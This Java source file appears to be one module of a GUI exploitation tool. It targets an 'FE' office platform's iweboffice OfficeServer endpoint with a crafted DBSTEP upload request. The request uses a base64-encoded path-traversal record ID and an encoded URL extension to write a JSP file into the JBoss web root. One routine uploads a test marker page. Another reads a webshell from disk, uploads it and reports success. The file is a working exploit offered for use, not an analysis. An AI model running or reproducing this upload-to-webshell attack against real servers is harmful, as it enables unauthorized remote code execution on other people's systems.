package exp.oa.FE;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.apache.commons.math3.analysis.function.Exp;
import utils.HttpTools;
import utils.Methods;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class FE_iweboffice_OfficeServer_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String OfficeServer(String url,String filename,String content){
        try {


            HashMap head = new HashMap();
            String postData = "DBSTEP V3.0     93                     0        28              DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUZJTEU=\r\n" +
                    "RECORDID=Li4vLi4vLi4vamJvc3Mvd2ViL2ZlLndhci91aWQuanNw\r\n" +
                    content;
            Response res = HttpTools.post(url + "/iweboffice/OfficeServer.js%70", postData, head, "utf-8");
            Thread.sleep(3000);
            if (res.getCode() == 200 && res.getText().contains("saO05rPJuaYh")) {
                Response res1 = HttpTools.get(url + "/uid.jsp;.js", new HashMap<>(), "utf-8");
                if (res1.getText().contains(content) || res1.getText().contains("R4g")) {
                    return url + "/uid.jsp;.js";
                }
            }
        }catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            String payload = "<% out.println(\"R4gTestR4g\");%>";
            String result = OfficeServer(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ FE_iweboffice_OfficeServer_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: \n"+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n ");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        try {
            String shell_payload = Methods.readFile(cmd).replace("<%","<% ");
            long tt = (new Date()).getTime();
            String filename = "R4g"+tt+".jsp";
            String payload = "<% out.println(\"R4gTest\");%>\n"+shell_payload;
            String result = OfficeServer(url,filename,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: \n"+result);
                    textArea_cmd.appendText("\n "+ get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
